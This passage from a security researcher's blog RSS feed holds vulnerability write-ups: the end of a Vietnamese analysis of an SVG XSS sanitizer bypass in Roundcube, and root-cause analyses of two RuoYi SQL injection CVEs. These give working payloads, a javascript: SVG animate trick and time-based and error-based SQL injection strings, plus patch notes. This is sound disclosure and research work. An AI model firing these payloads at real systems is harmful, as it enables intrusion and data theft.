<p>Bypass bằng cách thay href bằng xlink:href:  <code>&lt;animate attributeName=&quot;xlink:href&quot; ...&gt;</code> khi đó:</p>
<ul>
<li>Biến <code>$attr_value</code> mà hàm ở Ảnh 1 đang tìm kiếm là chuỗi <strong><code>'href'</code></strong>.</li>
<li>Nhưng giá trị thực tế truyền vào là chuỗi <strong><code>xlink:href</code></strong>.</li>
<li>Khi hàm <code>attribute_value()</code>  thực hiện so sánh: <code>'href' === 'xlink:href'</code>, kết quả trả về là <strong>False</strong>.</li>
</ul>
<p>→ Ứng dũng sẽ bỏ qua <code>if</code> và không bị block.</p>
<h3 id="limitation">Limitation</h3>
<p>Để hiển thị email đồng nhất, ứng dụng bọc nội dung vào một cấu trúc HTML. Điều này ép lớp <code>DOMDocument</code> của PHP phải sử dụng trình phân tích cú pháp HTML (<code>loadHTML()</code>) thay vì XML (<code>loadXML()</code>)</p>
<p></p>
<p></p>
<p></p>
<p>Trình phân tích HTML không hỗ trợ các tiêu chuẩn của XML namespace. Do đó, trong quá trình xử lý, nó đã âm thầm loại bỏ khai báo bắt buộc <code>xmlns:xlink</code> và tự động chuyển không gian tên của SVG (<code>http://www.w3.org/2000/svg</code>) sang chuẩn HTML (<code>http://www.w3.org/1999/xhtml</code>).</p>
<p>Từ phiên bản 1.5.8, Roundcube đã thêm CSP header khi người dùng xem ảnh trực tiếp trên trình duyệt:</p>
<p></p>
<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
<p>Gửi mail kèm file svg với nội dung như sau:
<code>xss.svg</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&lt;svg xmlns:xlink<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://www.w3.org/1999/xlink&#34;</span>
</span></span><span style="display:flex;"><span>     xmlns<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://www.w3.org/2000/svg&#34;</span>&gt;
</span></span><span style="display:flex;"><span>  &lt;a&gt;
</span></span><span style="display:flex;"><span>    &lt;animate attributeName<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;xlink:href&#34;</span> dur<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0.1s&#34;</span> fill<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;freeze&#34;</span>
</span></span><span style="display:flex;"><span>             values<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript:alert(1)&#34;</span>/&gt;
</span></span><span style="display:flex;"><span>    &lt;text x<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;100&#34;</span> y<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;100&#34;</span>
</span></span><span style="display:flex;"><span>          font-weight<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;bold&#34;</span>&gt;Click me!!!&lt;/text&gt;
</span></span><span style="display:flex;"><span>  &lt;/a&gt;
</span></span><span style="display:flex;"><span>&lt;/svg&gt;
</span></span></code></pre></div><p></p>
<p>Open image in new tab:</p>
<p></p>
<p>Click → XSS:</p>
<p></p>
<h2 id="patch">Patch</h2>
<p></p>
<p>Hàm Regex này sẽ tìm và xóa mọi thứ từ đầu chuỗi cho đến dấu hai chấm <code>:</code>.</p>
<p>Nếu truyền vào giá trị <code>xlink:href</code> (hoặc bất kỳ tên ảo nào như <code>abc:href</code>), hàm này sẽ cắt bỏ phần đầu, chỉ giữ lại chữ <code>href</code>.</p>
<p>Khi đó, phép so sánh cuối cùng sẽ là <code>'href' === 'href'</code> (trả về True).</p>
]]></description>
</item>
<item>
    <title>Blind SQL Injection at Rouyi framework ≤ v4.7.9 (CVE-2024-42900)</title>
    <link>https://g03m0n.github.io/posts/cve-2024-42900/</link>
    <pubDate>Tue, 27 Aug 2024 08:29:01 &#43;0800</pubDate>
    <author>g03m0n</author>
    <guid>https://g03m0n.github.io/posts/cve-2024-42900/</guid>
    <description><![CDATA[<h1 id="blind-sql-injection-at-rouyi-framework--v479-cve-2024-42900">Blind SQL Injection at Rouyi framework ≤ v4.7.9 (CVE-2024-42900)</h1>
<h2 id="1-description-and-impact">1. <strong>Description and Impact</strong></h2>
<p>The Blind SQL Injection vulnerability occurs in the file <code>com/ruoyi/generator/controller/GenController</code> specifically at the endpoint <code>/tool/gen/createTable</code>. Manipulating this file allows an attacker to execute arbitrary SQL commands, which can endanger the security, integrity, and availability of the system.</p>
<p>SQL injection vulnerability in <code>/tool/gen/createTable</code> in Ruoyi Framework at version ≤ 4.7.9 allows attackers to execute arbitrary SQL commands via the <code>sql</code> parameter.</p>
<table>
<thead>
<tr>
<th><strong>Type</strong></th>
<th><strong>Required Authentication</strong></th>
<th><strong>Version Affected</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>SQL Injection</td>
<td>Yes</td>
<td>All versions</td>
</tr>
</tbody>
</table>
<h2 id="2-root-cause-analysis">2. <strong>Root Cause Analysis</strong></h2>
<p>After patching vulnerabilities <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-4566" target="_blank" rel="noopener noreffer">CVE-2022-4566</a>
 with commit <a href="https://gitee.com/y_project/RuoYi/commit/167970e5c4da7bb46217f576dc50622b83f32b40" target="_blank" rel="noopener noreffer">https://gitee.com/y_project/RuoYi/commit/167970e5c4da7bb46217f576dc50622b83f32b40</a>
, the SQLi vulnerability still exists at the endpoint <code>/tool/gen/createTable</code> as <strong>Blind SQLi.</strong></p>
<p>Read my CVE-2022-4566 analyze <a href="https://g03m0n.github.io/posts/cve-2022-4566/" target="_blank" rel="noopener noreffer">here</a>
</p>
<h2 id="3-steps-to-reproduce">3. <strong>Steps to reproduce</strong></h2>
<p><strong>Set up environment</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> <span style="color:#a6e22e">git</span> <span style="color:#66d9ef">clone</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">://</span><span style="color:#a6e22e">gitee</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span><span style="color:#f92672">/</span><span style="color:#a6e22e">y_project</span><span style="color:#f92672">/</span><span style="color:#a6e22e">RuoYi</span><span style="color:#f92672">.</span><span style="color:#a6e22e">git</span>
</span></span></code></pre></div><p><a href="https://doc.ruoyi.vip/ruoyi/document/hjbs.html" target="_blank" rel="noopener noreffer">https://doc.ruoyi.vip/ruoyi/document/hjbs.html</a>
</p>
<p><strong>PoC</strong></p>
<p>Log in using the account<code>admin/admin123</code>and send a POST request to the endpoint <code>/tool/gen/createTable</code></p>
<p><strong>Payload</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sql<span style="color:#f92672">=</span>create table test <span style="color:#66d9ef">as</span> select<span style="color:#f92672">/**/*</span> <span style="color:#f92672">from</span> sys_job where <span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> union select<span style="color:#f92672">/**/</span>sleep(<span style="color:#ae81ff">10</span>),<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">9</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">11</span>,<span style="color:#ae81ff">12</span>,<span style="color:#ae81ff">13</span>;
</span></span></code></pre></div><p></p>

   <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
     <iframe src="https://www.youtube.com/embed/4rmbBW8QHOk" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
   </div>

]]></description>
</item>
<item>
    <title>CVE-2022-4566</title>
    <link>https://g03m0n.github.io/posts/cve-2022-4566/</link>
    <pubDate>Sun, 25 Aug 2024 08:29:01 &#43;0800</pubDate>
    <author>g03m0n</author>
    <guid>https://g03m0n.github.io/posts/cve-2022-4566/</guid>
    <description><![CDATA[<h1 id="sql-injection-at-rouyi-framework-cve-2022-4566">SQL Injection at Rouyi framework (CVE-2022-4566)</h1>
<h2 id="1-description-and-impact">1. <strong>Description and Impact</strong></h2>
<p>CVE-2022-4566 is a critical vulnerability identified in the RuoYi Framework. This vulnerability occurs in the file com/ruoyi/generator/controller/GenController and is related to SQL injection attacks. Manipulating this file allows an attacker to execute arbitrary SQL commands, potentially compromising the security, integrity, and availability of the system.</p>
<table>
<thead>
<tr>
<th><strong>Type</strong></th>
<th><strong>Required Authentication</strong></th>
<th><strong>?-day</strong></th>
<th><strong>CVSS</strong></th>
<th><strong>Version Affected</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>SQL Injection</td>
<td>Yes</td>
<td>n-day</td>
<td>9.8 (NIST)</td>
<td>≤ 4.7.5</td>
</tr>
</tbody>
</table>
<h2 id="2-root-cause-analysis">2. Root cause analysis</h2>
<p>First, the application allows users to create tables by sending a POST packet containing SQL statements to the endpoint <code>/tool/gen/createTables</code></p>
<p></p>
<p>Success create table:</p>
<p></p>
<p>The vulnerability occurs here when an attacker can inject arbitrary SQL commands into the user input.</p>
<p><strong>Debug:</strong></p>
<p></p>
<p>Initially, the <code>filterKeyword()</code> method receives the <code>sql</code> value of String type, which is the user&rsquo;s input.</p>
<p>Inside the <code>filterKeyword()</code> function, the application checks if there is input using the <code>isEmpty()</code> function. If there is, it moves to the next statement.</p>
<p>Here, the application uses the <code>StringUtils.split()</code> method to split the <code>SQL_REGEX</code> string into an array of SQL statements based on the pipe (<code>|</code>) delimiter, then assigns it to the <code>sqlKeywords</code> array.</p>
<p></p>
<p></p>
<p>Next, the application iterates through all elements of the <code>sqlKeywords</code> array, with <code>sqlKeyword</code> successively taking the value of each SQL statement in the <code>sqlKeywords</code> array.</p>
<p></p>
<p>The application uses the <code>indexOfIgnoreCase()</code> method to find the first occurrence of the sqlKeyword array in the value string, case-insensitive. If <code>indexOfIgnoreCase()</code> returns a value <code>&gt; -1</code>, it means <code>sqlKeyword</code> has been found in value. This condition checks if the value string contains any SQL statement matching the blacklist.</p>
<p>If an SQL statement is found in value, this code snippet will throw an Exception: <code>UtilException.&quot;参数存在SQL注入风险&quot;</code> which means <code>Parameter has risk of SQL Injection attack</code>.</p>
<p>After validating the input, the application will continue to run.</p>
<p></p>
<p>Since the application allows multiple statements to be executed simultaneously, it uses the <code>SQLUtils.parseStatements()</code> method to split the input SQL string into a list of SQL statements and then assigns it to the <code>sqlStatements</code></p>
<p><code>List&lt;String&gt;tableNames = new ArrayList&lt;&gt;();</code> : Creates a list to store the names of created tables.</p>
<p></p>
<p>Next, the application iterates through each SQL statement in <code>sqlStatements</code> with the element <code>sqlStatement</code>.</p>
<p></p>
<p>Here, the application checks if the statement is <code>CREATE TABLE</code> by using <code>instanceof</code>. If true, it converts that statement to a <code>MySqlCreateTableStatement</code> object.</p>
<p>Next, the application will call the <code>genTableService.createTable</code> method to execute the SQL statement.</p>
<p></p>
<p>If successful, it retrieves the table name and adds it to the <code>tableNames</code> list.</p>
<p>If an error occurs, the application will jump to the catch block and output an error message along with <code>e.getMessage()</code> containing the result of the newly passed SQL statement.</p>
<p>→ This is the <strong>Sink</strong> of the vulnerability</p>
<p></p>
<p>→ This is an <strong>Error-Based</strong> SQL Injection vulnerability.</p>
<h2 id="3-steps-to-reproduce">3. Steps to reproduce</h2>
<p>Send a POST request to the endpoint <code>/tool/gen/createTable</code> with the Payload:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sql</span><span style="color:#f92672">=</span><span style="color:#a6e22e">CREATE</span> <span style="color:#a6e22e">table</span> <span style="color:#a6e22e">keke</span> <span style="color:#a6e22e">as</span> <span style="color:#a6e22e">SELECT</span><span style="color:#75715e">/**/</span><span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">sys_job</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> 
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">AND</span><span style="color:#75715e">/**/</span><span style="color:#a6e22e">extractvalue</span>(<span style="color:#ae81ff">1</span>,<span style="color:#a6e22e">concat</span>(<span style="color:#ae81ff">0x7e</span>,(<span style="color:#a6e22e">select</span><span style="color:#75715e">/**/</span><span style="color:#a6e22e">version</span>()),<span style="color:#ae81ff">0x7e</span>));
</span></span></code></pre></div><p></p>
<h2 id="4-recomendation">4. Recomendation</h2>
<p>In version 4.7.6, RuoYi added a commit with the code <a href="https://gitee.com/y_project/RuoYi/commit/167970e5c4da7bb46217f576dc50622b83f32b40" target="_blank" rel="noopener noreffer">167970e5c4da7bb46217f576dc50622b83f32b40</a>
 to add some statements to the blacklist and not directly return <code>e.getMessage()</code> to summarize error information to avoid SQL injection.</p>
<h2 id="references">References</h2>
<p><a href="https://gitee.com/y_project/RuoYi/issues/I65V2B" target="_blank" rel="noopener noreffer">https://gitee.com/y_project/RuoYi/issues/I65V2B</a>
</p>
<p><a href="https://www.cvedetails.com/cve/CVE-2022-4566/?q=cve-2022-4566" target="_blank" rel="noopener noreffer">CVE-2022-4566 Details</a>
</p>
<p><a href="https://www.cvedetails.com/cve/CVE-2022-48114/?q=cve-2022-48114" target="_blank" rel="noopener noreffer">https://www.cvedetails.com/cve/CVE-2022-48114/?q=cve-2022-48114</a>
</p>
]]></description>
</item>
</channel>
</rss>
